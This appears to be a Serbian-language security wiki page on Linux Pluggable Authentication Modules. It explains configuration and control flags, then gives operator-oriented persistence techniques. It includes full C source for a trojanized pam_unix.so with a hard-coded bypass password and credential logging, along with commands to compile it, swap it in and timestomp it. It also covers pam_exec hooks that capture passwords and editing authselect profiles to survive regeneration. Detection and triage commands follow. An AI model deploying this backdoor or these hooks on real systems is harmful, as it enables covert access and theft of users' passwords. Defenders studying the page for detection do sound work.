# PAM - Pluggable Authentication Modules

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** deluje kao bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim servisima**, kontrolišući njihov pristup na osnovu različitih kriterijuma. Sličan je digitalnom vrataru, koji osigurava da samo ovlašćeni korisnici mogu da koriste određene servise, uz potencijalno ograničavanje njihovog korišćenja kako bi se sprečilo preopterećenje sistema.

#### Konfiguracione datoteke

- **Solaris** podržava zastarelu centralnu datoteku `/etc/pam.conf`, ali aktuelne smernice daju prednost servisnim datotekama u okviru `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux sistemi** daju prednost pristupu zasnovanom na direktorijumu, čuvajući konfiguracije specifične za servise u okviru `/etc/pam.d`. Na primer, konfiguraciona datoteka za login servis nalazi se na `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Primer PAM konfiguracije za login servis može izgledati ovako:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ovi domeni, odnosno grupe za upravljanje, obuhvataju **auth**, **account**, **password** i **session**, pri čemu je svaki odgovoran za različite aspekte procesa autentifikacije i upravljanja sesijom:<sup>[[1]](#references)</sup>

- **Auth**: Proverava identitet korisnika, često zahtevajući unos lozinke.
- **Account**: Upravlja proverom naloga, uključujući uslove kao što su članstvo u grupi ili ograničenja u zavisnosti od doba dana.
- **Password**: Upravlja ažuriranjem lozinke, uključujući proveru složenosti ili sprečavanje dictionary attacks.
- **Session**: Upravlja radnjama tokom pokretanja ili završetka servisne sesije, kao što su montiranje direktorijuma ili postavljanje ograničenja resursa.

#### **PAM Module Controls**

Kontrole određuju odgovor modula na uspeh ili neuspeh i utiču na celokupan proces autentifikacije. One obuhvataju:<sup>[[1]](#references)</sup>

- **Required**: Neuspeh obaveznog modula dovodi do konačnog neuspeha, ali tek nakon provere svih narednih modula.
- **Requisite**: Trenutno prekidanje procesa nakon neuspeha.
- **Sufficient**: Ako nijedan raniji `required` modul nije doživeo neuspeh, uspeh se odmah vraća i preostali moduli u istoj grupi za upravljanje se preskaču.
- **Optional**: Dovodi do neuspeha samo ako je jedini modul u stack-u.

#### Offensive Semantics That Matter

Prilikom analiziranja ili izmene PAM-a, **lokacija ubačenog pravila** određuje koji stack ga učitava:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` i `substack` učitavaju pravila iz drugih datoteka, pa izmena datoteke `sshd` može uticati samo na SSH, dok izmena datoteke `system-auth`, `common-auth` ili drugog deljenog stack-a može istovremeno uticati na više servisa.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM takođe podržava kontrole u uglastim zagradama, kao što je `[success=1 default=ignore]`. One mogu biti zloupotrebljene za **preskakanje jednog ili više modula** nakon uspešne prilagođene provere, umesto vidljive zamene modula `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` može biti **apsolutna** putanja (`/usr/lib/security/pam_custom.so`) ili **relativna** u odnosu na podrazumevani direktorijum PAM modula. Na modernim Linux sistemima stvarni direktorijumi često su `/lib/security`, `/lib64/security`, `/usr/lib/security` ili multiarch putanje kao što je `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kratak operatorov zaključak: uvek mapirajte **ceo graf servisa** pre patchovanja. Na primer, `sshd -> password-auth -> system-auth` na nekim distribucijama ili `sshd -> system-remote-login -> system-login -> system-auth` na drugim znači da se isti implant u jednoj liniji može proširiti mnogo šire nego što je nameravano.<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

U postavci sa više auth modula, proces prati strogo definisan redosled. Ako modul `pam_securetty` utvrdi da terminal za prijavljivanje nije autorizovan, root prijavljivanja se blokiraju, ali se svi moduli i dalje obrađuju zbog njegovog statusa "required". Modul `pam_env` postavlja promenljive okruženja, što potencijalno poboljšava korisničko iskustvo. Moduli `pam_ldap` i `pam_unix` zajedno autentifikuju korisnika, pri čemu `pam_unix` pokušava da upotrebi prethodno prosleđenu lozinku, čime se poboljšavaju efikasnost i fleksibilnost metoda autentifikacije.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Klasičan persistence trik u Linux okruženjima visoke vrednosti jeste **zamena legitimne PAM biblioteke trojanizovanim drop-in modulom**. Na hostu čiji PAM stack učitava `pam_unix.so`, SSH ili autentifikacija preko konzole mogu pozvati njegovu ulaznu tačku `pam_sm_authenticate()`; zlonamerna zamena može prikupljati kredencijale ili implementirati *magic* zaobilaženje lozinke.<sup>[[2]](#references)[[11]](#references)</sup>

### Podsetnik za kompajliranje
Skica u nastavku koristi Linux-PAM-ovu servisnu ulaznu tačku `pam_sm_authenticate()` i `pam_get_authtok()` za pristup autentifikacionom tokenu.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Primer trojanizovanog `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Kompajlirajte i izvršite stealth-replace (obrazac replacement/timestomp dokumentovao je Unit 42). Prilagodite i backup path hard-coded u wrapperu i komande u nastavku stvarnom direktorijumu PAM modula na ciljnom sistemu:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec saveti
1. **Atomic overwrite** – upišite kompletnu biblioteku u privremenu datoteku i preimenujte je na odredišno mesto kako biste izbegli ostavljanje delimično upisanog authentication modula.
2. Putanja kao što je `/usr/bin/.dbus.log` uočena je u Unit 42 AuthDoor analizi, pa je takođe koristan hunting indikator.<sup>[[2]](#references)</sup>
3. Očuvajte entry points koje očekuje PAM stack (na primer, `pam_sm_authenticate` i `pam_sm_setcred`) kako bi ostale operacije upravljanja nastavile da rade.<sup>[[11]](#references)[[18]](#references)</sup>

### Detekcija
Za provere integriteta paketa, RPM proverava metadata instaliranih datoteka, `debsums -s` prijavljuje greške kontrolnih suma, a `dpkg -S` u triage bloku proverava vlasništvo nad paketima; audit watch sintaksa beleži upise i promene atributa putanje.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Uporedite MD5/SHA256 vrednosti `pam_unix.so` sa distro paketom.
* Koristite `rpm -V pam` ili `debsums -s libpam-modules` da biste uočili zamenjene biblioteke bez ručnog izračunavanja hash vrednosti.
* Proverite da li postoje world-writable datoteke ili neuobičajeno vlasništvo unutar `/lib/security/`.
* `auditd` pravilo: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije za neočekivane module: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Komande za brzi triage (nakon kompromitacije ili tokom threat huntinga)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Zloupotreba `pam_exec` za persistence
Umesto zamene `pam_unix.so`, blaži pristup je dodavanje `pam_exec` linije u `/etc/pam.d/sshd`, tako da invocation koji dosegne tu PAM liniju pokrene helper, dok normalni stack ostaje netaknut.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` prima PAM metapodatke u promenljivama okruženja kao što su `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Sa opcijom `expose_authtok`, helper može da pročita do `PAM_MAX_RESP_SIZE` bajtova lozinke sa `stdin` tokom faza `auth` ili `password`. Ako želite da se helper pokreće sa effective UID umesto sa real UID, dodajte `seteuid`.<sup>[[4]](#references)</sup>

Praktične napomene prate tipove modula i filter `type=` dokumentovan za `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` je bolji za **radnje nakon prijavljivanja**, kao što su ponovno otvaranje socket-a ili pokretanje detached daemon-a.
- `auth optional pam_exec.so quiet expose_authtok ...` je uobičajen izbor za **hvatanje kredencijala** jer se izvršava pre otvaranja session-a.
- `type=session` ili `type=auth` mogu se koristiti za ograničavanje izvršavanja na određenu PAM fazu i izbegavanje bučnog dvostrukog izvršavanja.

### Preživljavanje distro tooling-a: `authselect`

Na RHEL i Fedora-family sistemima koji koriste `authselect`, direktne izmene generisanih fajlova kao što su `/etc/pam.d/system-auth` ili `/etc/pam.d/password-auth` može **prepisati `authselect`**. Radi persistence-a, operatori često menjaju aktivni custom profil u `/etc/authselect/custom/<profile>/`, a zatim ga ponovo izaberu.<sup>[[5]](#references)[[19]](#references)</sup>

Tipičan workflow kada imate root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Ovo je važno i za ofanzivu i za triage: ako `/etc/pam.d/system-auth` sadrži baner `Generated by authselect` i `Do not modify this file manually`, onda se prava persistence tačka možda nalazi u `/etc/authselect/custom/`, a ne u `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Nedavni tradecraft primećen u praksi

Nedavni izveštaji iz 2025. o **Plague** Linux backdooru pokazali su istu osnovnu ideju izvedenu korak dalje: zlonamernu PAM komponentu sa **statičkom bypass lozinkom**, uz uklanjanje SSH-povezanih promenljivih okruženja i istorije shell-a (`HISTFILE=/dev/null`) radi smanjenja tragova sesije nakon prijavljivanja.<sup>[[3]](#references)</sup> To je koristan obrazac za hunting, jer logika backdoora može biti smeštena u PAM-u, dok se artefakti stealth-a pojavljuju tek **nakon** uspešne autentifikacije.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Priručnik prikrivenog operatora: infiltracija globalnih telekomunikacionih mreža - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: novootkriveni PAM-based backdoor za Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurisanje autentifikacije korisnika pomoću authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian priručnici](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux manual page](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian priručnici](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Upravljanje autentifikacijom u Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Vodič za autentifikaciju na nivou sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu lista datoteka paketa: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian priručnici](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Izmene/učiniti authselect obaveznim - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
